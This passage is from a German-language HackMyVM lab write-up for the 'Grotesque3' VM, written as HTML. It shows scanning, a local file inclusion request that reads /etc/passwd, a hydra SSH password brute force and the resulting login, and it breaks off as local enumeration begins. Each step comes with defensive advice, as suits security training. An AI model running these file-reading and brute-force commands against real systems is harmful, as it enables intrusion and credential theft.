@@ -1,0 +1,651 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grotesque3 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Die Hintergrundfarbe #03b5f5 muss in style.css bei .header-bg gesetzt werden -->
+    <div class="header-bg">
+        <h1>Grotesque3 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe Rot muss in style.css bei .level-container h2 gesetzt werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                 <!-- Die Farbe Rot muss in style.css bei .segment-1, .segment-2, .segment-3 gesetzt werden -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- Die Hintergrundfarbe muss in style.css bei .circle .inner passend zum Header gesetzt werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">nbtscan</div>
+                <div class="tool-item">Metasploit (msfconsole)</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">nc (netcat)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.119	08:00:27:9c:83:dc	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Layer 2) nach aktiven Geräten zu durchsuchen. Er sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen IP-Adressen im lokalen Subnetz und listet die Geräte auf, die antworten. Die Ausgabe zeigt die IP-Adresse (192.168.2.119), die MAC-Adresse (08:00:27:9c:83:dc) und den Hersteller der Netzwerkkarte (PCS Systemtechnik GmbH, was oft auf eine VirtualBox-VM hinweist).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser erste Schritt ist fundamental für das Netzwerk-Scanning. Wir haben erfolgreich die IP-Adresse unseres Ziels im lokalen Netzwerk identifiziert. Das Wissen um die MAC-Adresse und den Hersteller kann in späteren Phasen nützlich sein, ist aber hier primär zur Bestätigung der Ziel-IP relevant. Die Erkennung als PCS Systemtechnik GmbH ist ein starker Indikator für eine virtuelle Maschine, was in CTF-Szenarien häufig der Fall ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP-Adresse (192.168.2.119) ist nun das primäre Ziel für weitere Scans (z.B. Port-Scanning mit Nmap). Es ist gut, die MAC-Adresse zu notieren, falls IP-Adressen dynamisch vergeben werden, obwohl dies in einem gezielten Test weniger wahrscheinlich ist.<br><strong>Empfehlung (Admin):</strong> Aus administrativer Sicht zeigt dieser Scan, dass das Gerät im Netzwerk sichtbar ist. Wichtigere Maßnahmen sind die Härtung der Dienste auf dem Gerät selbst und Netzwerksegmentierung, um die Reichweite solcher Scans einzuschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide info atlasg.jpg</span></div>
+                    <pre>"atlasg.jpg":
+  Format: jpeg
+  Kapazitat: 105,5 KB
+Soll versucht werden, Information über eingebettete Daten anzuzeigen ? (j/n) j
+Passwort eingeben: 
+<span class="password">steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `steghide info atlasg.jpg` wird verwendet, um Informationen über potenziell versteckte Daten (Steganographie) in der Bilddatei `atlasg.jpg` zu erhalten. Das Tool erkennt, dass es sich um ein JPEG-Format handelt und eine Kapazität von 105,5 KB für versteckte Daten hat. Die anschließende Abfrage, ob versucht werden soll, Informationen anzuzeigen (`j` für ja), führt zu einer Passwortabfrage. Da kein Passwort bekannt ist, wird die Eingabetaste gedrückt, was fehlschlägt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt deutet darauf hin, dass die Datei `atlasg.jpg` möglicherweise mittels `steghide` steganographisch präpariert wurde. Der fehlgeschlagene Versuch ohne Passwort bestätigt, dass ein Passwortschutz vorhanden ist. Dies ist ein Hinweis darauf, dass in diesem Bild relevante Informationen versteckt sein könnten, die für den weiteren Verlauf des Pentests wichtig sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `steghide` ein Passwort benötigt, sollten spezialisierte Tools zum Brechen von Steganographie-Passwörtern (wie `stegseek`) oder andere Steganographie-Tools (wie `stegsnow`) ausprobiert werden, falls `steghide` das falsche Werkzeug war.<br><strong>Empfehlung (Admin):</strong> Wenn sensible Daten mittels Steganographie versteckt werden, sollten starke Passwörter verwendet werden. Besser ist es jedoch, sensible Daten gar nicht erst in öffentlich zugänglichen oder leicht verbreitbaren Dateien wie Bildern zu verstecken, sondern sichere Speicherorte und Verschlüsselungsmethoden zu nutzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C atlasg.jpg</span></div>
+                    <pre>Warning: residual of 5 bits not uncompressed
+yyyssdbssytbb0stbbbbbbbs	tbbbbbb  </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `stegsnow -C atlasg.jpg` versucht, mit dem Tool `stegsnow` versteckte Daten aus der Datei `atlasg.jpg` zu extrahieren. `stegsnow` ist ein weiteres Steganographie-Tool, das Daten in Textdateien (insbesondere durch Leerzeichen am Zeilenende) oder eben auch in anderen Formaten verstecken kann. Die Option `-C` steht für Kompression. Die Ausgabe `yyyssdbssytbb0stbbbbbbbs tbbbbbb` ist das Ergebnis des Extraktionsversuchs. Die Warnung `residual of 5 bits not uncompressed` weist auf mögliche Probleme bei der Dekomprimierung oder Extraktion hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch mit `stegsnow` liefert eine scheinbar zufällige Zeichenkette. Dies könnte Müll sein, oder es ist ein verschlüsselter Text, der noch weiter entschlüsselt werden muss, oder es ist ein Hinweis, dass `stegsnow` nicht das korrekte Tool oder die korrekte Methode für diese Datei ist. Angesichts des vorherigen `steghide`-Versuchs ist es wahrscheinlicher, dass `steghide` das verwendete Tool war und wir ein Passwort benötigen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die ausgegebene Zeichenkette sollte vorerst gespeichert werden, falls sie später relevant wird (z.B. als Teil eines Passworts oder Schlüssels). Da `steghide` wahrscheinlicher erscheint, sollte der Fokus auf das Knacken des `steghide`-Passworts gelegt werden.<br><strong>Empfehlung (Admin):</strong> Ähnlich wie bei `steghide`: Verwendung starker Methoden und Passwörter, falls Steganographie eingesetzt wird. Primär sollten aber sicherere Methoden zur Datenübertragung und -speicherung verwendet werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek atlasg.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.51% (132.8 MB)           
+<span class="password">[!] error: Could not find a valid passphrase.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `stegseek atlasg.jpg /usr/share/wordlists/rockyou.txt` verwendet das Tool `stegseek`, um zu versuchen, das Passwort für die mit `steghide` versteckten Daten in `atlasg.jpg` zu knacken. `stegseek` ist speziell dafür optimiert, `steghide`-Passwörter mittels einer Wörterbuchattacke (hier mit der bekannten Liste `rockyou.txt`) sehr schnell zu testen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Trotz des Einsatzes von `stegseek` und der umfangreichen `rockyou.txt`-Liste konnte kein gültiges Passwort gefunden werden. Das bedeutet entweder, dass das Passwort nicht in `rockyou.txt` enthalten ist (es könnte komplexer, länger oder nicht standardmäßig sein) oder dass die Datei vielleicht doch nicht mit `steghide` oder einem knackbaren Passwort geschützt wurde. Der Steganographie-Ansatz scheint hier vorerst in einer Sackgasse zu stecken.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Steganographie-Versuche erfolglos waren, sollte dieser Angriffsvektor vorerst zurückgestellt und andere potenzielle Schwachstellen untersucht werden (z.B. Webserver, offene Ports). Man könnte später mit anderen Passwortlisten oder Brute-Force-Methoden zurückkehren, aber das ist oft sehr zeitaufwendig.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht die Effektivität eines starken, nicht standardmäßigen Passworts, selbst wenn Steganographie verwendet wird. Es zeigt auch, dass gängige Passwortlisten wie `rockyou.txt` eine reale Bedrohung darstellen und vermieden werden sollten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.119 -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+<span class="command">http://192.168.2.119/index.html</span>           [Size: 590]</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `gobuster dir` wird für das "Directory Busting" verwendet, also das Suchen nach versteckten oder nicht direkt verlinkten Verzeichnissen und Dateien auf einem Webserver.
+                *   `-u http://192.168.2.119`: Gibt die Ziel-URL an.
+                *   `-x ...`: Definiert eine lange Liste von Dateiendungen, nach denen zusätzlich gesucht werden soll.
+                *   `-w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Gibt die Wortliste an, die für Verzeichnis- und Dateinamen verwendet wird.
+                *   `-b '403,404'`: Blendet Antworten mit den HTTP-Statuscodes 403 (Forbidden) und 404 (Not Found) aus.
+                *   `-e`: Erweiterter Modus, zeigt die vollständige URL für gefundene Verzeichnisse an.
+                *   `-t 100`: Erhöht die Anzahl der parallelen Threads auf 100, um den Scan zu beschleunigen.
+                *   `-n`: Verhindert die Ausgabe des Statuscodes bei Funden.
+                *   `-k`: Überspringt die SSL-Zertifikatsprüfung (hier nicht relevant, da HTTP).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Gobuster-Scan hat trotz der umfangreichen Optionen und der Medium-Wortliste nur die Standarddatei `index.html` gefunden. Dies deutet darauf hin, dass auf der Hauptebene des Webservers unter der IP-Adresse keine leicht auffindbaren, versteckten Verzeichnisse oder Dateien existieren, die in der verwendeten Wortliste enthalten sind. Möglicherweise gibt es Inhalte unter einem anderen Hostnamen (Virtual Host) oder der interessante Teil der Webanwendung liegt woanders.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da dieser Scan keine brauchbaren Ergebnisse lieferte, sollte als nächstes ein Port-Scan durchgeführt werden, um alle laufenden Dienste zu identifizieren. Es ist auch ratsam, nach virtuellen Hosts zu suchen (z.B. durch Fuzzing des Host-Headers oder Analyse von Zertifikaten, falls HTTPS vorhanden ist) oder Subdomain-Enumeration durchzuführen.<br><strong>Empfehlung (Admin):</strong> Regelmäßiges Scannen der eigenen Webserver mit Tools wie Gobuster hilft, unbeabsichtigt exponierte Dateien oder Verzeichnisse zu finden. Sicherstellen, dass keine sensiblen Dateien (Backups, Konfigurationsdateien, etc.) im Web-Root oder zugänglichen Unterverzeichnissen liegen. Die Konfiguration sollte das Auflisten von Verzeichnisinhalten verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.119 -p-</span></div>
+                    <pre>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-15 23:31 CET
+Nmap scan report for grotesque (192.168.2.119)
+Host is up (0.0013s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   2048 6afed61723cb90792bb12d3753974658 (RSA)
+|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
+|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6, Linux 5.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.27 ms grotesque (192.168.2.119)
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `nmap` führt einen umfassenden Scan auf dem Ziel 192.168.2.119 durch.
+                *   `-sS`: Führt einen TCP SYN-Scan durch (Stealth Scan), der oft weniger auffällig ist als ein voller TCP Connect-Scan.
+                *   `-sC`: Führt die Standard-Nmap-Skripte aus, um zusätzliche Informationen über die gefundenen Dienste zu sammeln.
+                *   `-T5`: Stellt das Timing-Template auf "insane", um den Scan maximal zu beschleunigen (kann unzuverlässig sein oder IDS/Firewalls auslösen).
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            Die Ergebnisse zeigen zwei offene Ports:
+                *   Port 22: SSH (OpenSSH 7.9p1 auf Debian 10).
+                *   Port 80: HTTP (Apache 2.4.38 auf Debian).
+            Nmap liefert auch die SSH-Hostkeys, den HTTP-Server-Header und versucht eine OS-Erkennung (Linux Kernel 4.x/5.x), warnt aber vor Unzuverlässigkeit. Die MAC-Adresse bestätigt erneut die VirtualBox-VM.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Nmap-Scan ist sehr informativ. Wir wissen jetzt definitiv, dass ein SSH-Dienst und ein Webserver laufen. Die Versionsnummern (OpenSSH 7.9p1, Apache 2.4.38, Debian 10) sind wichtig für die Suche nach bekannten Schwachstellen (CVEs). Die Tatsache, dass 65533 Ports als "filtered" angezeigt werden, deutet auf eine Firewall hin, die Pakete verwirft, anstatt mit einem RST/ICMP Unreachable zu antworten. Der fehlende Titel auf der Webseite (Port 80) ist ebenfalls ein kleiner Hinweis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die nächsten Schritte sollten sein:
+                1.  Den Webserver auf Port 80 genauer untersuchen (Virtual Host Fuzzing, tiefere Verzeichnis-Scans, manuelle Untersuchung der `index.html`).
+                2.  Nach bekannten Schwachstellen für OpenSSH 7.9p1 und Apache 2.4.38 auf Debian 10 suchen.
+                3.  Prüfen, ob Standard-Anmeldeinformationen für SSH funktionieren oder ob eine Benutzerliste für Brute-Force-Angriffe erstellt werden kann.
+                <br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass SSH und Apache auf die neuesten, gepatchten Versionen aktualisiert sind. SSH-Zugriff sollte idealerweise nur über Schlüssel und nicht über Passwörter erfolgen, und der Zugriff sollte auf bestimmte IPs beschränkt sein. Eine Web Application Firewall (WAF) kann zusätzlichen Schutz für den Webserver bieten. Die Firewall-Regeln sollten so konfiguriert sein, dass nur benötigte Ports offen sind und idealerweise REJECT statt DROP verwendet wird, um Scans zu erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>192.168.2.119    grotek.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die lokale `hosts`-Datei auf dem Angreifer-System (Kali/Cyber) im Texteditor `vi`. In diese Datei wird der Eintrag `192.168.2.119 grotek.hmv` hinzugefügt. Die `hosts`-Datei wird vom Betriebssystem verwendet, um Hostnamen manuell IP-Adressen zuzuordnen, bevor eine DNS-Abfrage durchgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist eine übliche Vorgehensweise im Pentesting, wenn vermutet wird, dass ein Webserver auf dem Zielsystem über einen bestimmten Hostnamen (Virtual Host) angesprochen werden muss, um andere Inhalte anzuzeigen als über die IP-Adresse. Der Hostname `grotek.hmv` wurde hier vermutlich aufgrund von Hinweisen (z.B. aus Zertifikaten, Kommentaren im Quellcode oder einfach als gängige Praxis in CTFs) gewählt oder erraten. `.hmv` könnte für "HackMyVM" stehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem dieser Eintrag hinzugefügt wurde, sollten alle weiteren Web-Anfragen an das Ziel (z.B. mit `curl`, `gobuster`, `wfuzz` oder im Browser) den Hostnamen `grotek.hmv` anstelle der IP-Adresse verwenden. Dies könnte zu völlig anderen Ergebnissen führen als die bisherigen Scans auf die IP.<br><strong>Empfehlung (Admin):</strong> Die Konfiguration von Virtual Hosts ist eine gängige Praxis. Administratoren sollten sicherstellen, dass keine sensiblen Informationen oder unterschiedlichen Funktionalitäten nur über bestimmte Hostnamen erreichbar sind, es sei denn, dies ist beabsichtigt und entsprechend abgesichert. DNS-Einträge sollten korrekt konfiguriert sein.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 0 --hc 404,403 -u "http://grotek.hmv/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd" -t 32</span></div>
+                    <pre> 
+ID           Response   Lines    Word       Chars       Payload                                              
+<span class="command">000017563:   200        27 L     40 W       1457 Ch     "purpose"</span>                                            
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `wfuzz` wird hier für Parameter-Fuzzing verwendet, speziell um einen Parameter zu finden, der für eine Local File Inclusion (LFI) Schwachstelle anfällig sein könnte.
+                *   `-c`: Farbige Ausgabe.
+                *   `-w ...medium.txt`: Gibt die Wortliste an, die als Werte für den gefuzzten Parameter verwendet wird (hier etwas ungewöhnlich, da normalerweise Parameter *Namen* gefuzzt werden, oder man erwartet eine spezifische LFI-Payload-Liste).
+                *   `--hh 0`: Blendet Antworten mit 0 Zeichen aus (Hidden Characters).
+                *   `--hc 404,403`: Blendet Antworten mit Statuscodes 404 und 403 aus.
+                *   `-u "http://grotek.hmv/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd"`: Dies ist die Kern-URL. `FUZZ` ist der Platzhalter, der durch die Wörter aus der Liste ersetzt wird. Interessanterweise wird hier direkt versucht, `/etc/passwd` als Wert zu inkludieren, während der *Parametername* gefuzzt wird.
+                *   `-t 32`: Setzt die Anzahl der Threads auf 32.
+            Das Ergebnis zeigt, dass bei der Verwendung des Payloads (Parametername) `purpose` ein HTTP-Statuscode 200 (OK) mit einer Antwortlänge von 1457 Zeichen zurückgegeben wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein bedeutender Fund! Es wurde ein verstecktes PHP-Skript (`f66b22bf020334b04c7d0d3eb5010391.php`) identifiziert, das einen Parameter namens `purpose` akzeptiert. Die Tatsache, dass die Anfrage `?purpose=/etc/passwd` einen Statuscode 200 zurückliefert (und nicht 404 oder 403, wie die meisten anderen Versuche, die ausgeblendet wurden), deutet stark auf eine Local File Inclusion (LFI)-Schwachstelle hin. Die Antwortgröße (1457 Chars) ist plausibel für den Inhalt von `/etc/passwd` plus den umgebenden HTML-Code.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene URL `http://grotek.hmv/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd` sollte sofort manuell (z.B. mit `curl` oder im Browser) aufgerufen werden, um den Inhalt zu bestätigen. Anschließend sollte versucht werden, andere sensible Dateien zu lesen (z.B. `/etc/shadow`, Konfigurationsdateien von Webserver oder Datenbank, SSH-Schlüssel, Log-Dateien, Anwendungsquellcode).<br><strong>Empfehlung (Admin):</strong> LFI-Schwachstellen sind kritisch. Der PHP-Code muss dringend überprüft und korrigiert werden. Benutzereingaben dürfen niemals direkt oder ungefiltert in Dateizugriffsfunktionen (wie `include`, `require`, `fopen`, `file_get_contents`) verwendet werden. Eingaben müssen validiert und saniert werden. Idealerweise sollte der Zugriff auf Dateien auf ein vordefiniertes, sicheres Verzeichnis beschränkt sein (Whitelisting).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://grotek.hmv/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd" | grep bash</span></div>
+                    <pre>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1457  100  1457    0     0  1347k      0 --:--:-- --:--:-- --:--:-- 1422k
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">freddie:x:1000:1000:freddie,,,:/home/freddie:/bin/bash</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `curl` wird verwendet, um den Inhalt der zuvor identifizierten URL abzurufen, die die LFI-Schwachstelle ausnutzt, um `/etc/passwd` zu lesen. Die Ausgabe von `curl` wird dann durch `grep bash` geleitet, um nur die Zeilen anzuzeigen, die den String "bash" enthalten. Dies filtert typischerweise die Benutzerkonten heraus, die eine Bash-Shell konfiguriert haben (also reguläre Benutzer und root).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt die LFI-Schwachstelle eindrucksvoll. Der Inhalt von `/etc/passwd` wird erfolgreich abgerufen und angezeigt. Wir identifizieren zwei Benutzer mit Bash-Shells: `root` (UID 0) und `freddie` (UID 1000). Der Benutzer `freddie` ist ein vielversprechendes Ziel für den nächsten Schritt, da Root-Konten oft schwerer direkt anzugreifen sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir haben nun einen Benutzernamen (`freddie`). Der nächste logische Schritt ist, zu versuchen, das Passwort für diesen Benutzer zu knacken, wahrscheinlich über den offenen SSH-Dienst (Port 22). Werkzeuge wie `hydra` oder `medusa` können hierfür verwendet werden, idealerweise mit einer guten Wortliste.<br><strong>Empfehlung (Admin):</strong> Die LFI-Schwachstelle muss sofort behoben werden (siehe vorherige Empfehlung). Zusätzlich sollten Passwortrichtlinien durchgesetzt werden, um schwache Passwörter zu verhindern. Regelmäßige Überprüfung der Benutzerkonten in `/etc/passwd` und Deaktivierung nicht benötigter Konten.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l freddie -P "/usr/share/wordlists/rockyou.txt" ssh://grotek.hmv -t 20</span></div>
+                    <pre>Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these  ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-16 00:03:05
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344412 login tries (l:1/p:14344412), ~717221 tries per task
+[DATA] attacking ssh://grotek.hmv:22/
+:
+<span class="password">[22][ssh] host: grotek.hmv   login: freddie   password: 61a4e3e60c063d1e472dd780f64e6cad</span>
+:</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `hydra` wird verwendet, um eine Brute-Force-Attacke auf den SSH-Dienst (`ssh://grotek.hmv`) durchzuführen.
+                *   `-l freddie`: Gibt den Benutzernamen an, der getestet werden soll.
+                *   `-P "/usr/share/wordlists/rockyou.txt"`: Gibt die Passwortliste an (`rockyou.txt`).
+                *   `-t 20`: Setzt die Anzahl der parallelen Verbindungsversuche auf 20. Hydra gibt eine Warnung aus, dass dies für SSH zu hoch sein könnte.
+            Hydra findet nach einiger Zeit erfolgreich ein gültiges Passwort für den Benutzer `freddie`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Passwort für den Benutzer `freddie` wurde gefunden: `<span class="password">61a4e3e60c063d1e472dd780f64e6cad</span>`. Dies ist ein MD5-Hash, der offenbar als Klartextpasswort verwendet wird. Dies ermöglicht uns den initialen Zugriff auf das System als Benutzer `freddie` über SSH.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort versuchen, sich mit den gefundenen Zugangsdaten (`freddie` / `<span class="password">61a4e3e60c063d1e472dd780f64e6cad</span>`) per SSH auf `grotek.hmv` einzuloggen. Nach erfolgreichem Login beginnt die Phase der lokalen Enumeration und Privilege Escalation.<br><strong>Empfehlung (Admin):</strong> Das Verwenden eines Hashes (insbesondere eines unsicheren wie MD5) als Klartextpasswort ist eine extrem schlechte Praxis und muss sofort geändert werden. Starke, einzigartige Passwörter erzwingen. SSH-Login nur mit Schlüsseln erlauben. Tools wie `fail2ban` installieren, um Brute-Force-Angriffe zu erkennen und zu blockieren. Die Anzahl der erlaubten SSH-Verbindungsversuche pro Zeitintervall begrenzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh freddie@grotek.hmv</span></div>
+                    <pre>The authenticity of host 'grotek.hmv (192.168.2.119)' can't be established.
+ED25519 key fingerprint is SHA256:P07e9iTTwbyQae7lGtYu8i4toAyBfYkXY9/kw/dyv/4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'grotek.hmv' (ED25519) to the list of known hosts.
+freddie@grotek.hmv's password: <span class="password">[Passwort hier eingegeben: 61a4e3e60c063d1e472dd780f64e6cad]</span>
+Linux grotesque 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+freddie@grotesque:~$ </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ssh freddie@grotek.hmv` initiiert eine SSH-Verbindung zum Zielhost `grotek.hmv` als Benutzer `freddie`. Da dies die erste Verbindung ist, wird der ED25519-Fingerabdruck des Hosts angezeigt und eine Bestätigung zum Fortfahren (`yes`) angefordert. Anschließend wird das zuvor mit Hydra gefundene Passwort (`61a4e3e60c063d1e472dd780f64e6cad`) eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login war erfolgreich! Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `freddie`. Der Prompt ändert sich zu `freddie@grotesque:~$`, was unseren initialen Zugriff bestätigt. Die angezeigten Systeminformationen (Linux grotesque 4.19.0-13-amd64, Debian) sind nützlich für die weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Jetzt beginnt die lokale Enumeration:
+                *   Grundlegende Befehle: `id`, `whoami`, `pwd`, `ls -la`, `uname -a`, `cat /etc/issue`, `sudo -l`.
+                *   Netzwerkinformationen: `ip a`, `ss -tulpen` oder `netstat -tulpen`.
+                *   Suche nach interessanten Dateien: Home-Verzeichnis (`ls -la ~`), `/tmp`, `/var/www`, Konfigurationsdateien.
+                *   Suche nach SUID/GUID-Binaries, Cronjobs, laufenden Prozessen (`ps aux`).
+                *   Versuch, die `user.txt`-Flag zu finden (oft im Home-Verzeichnis).
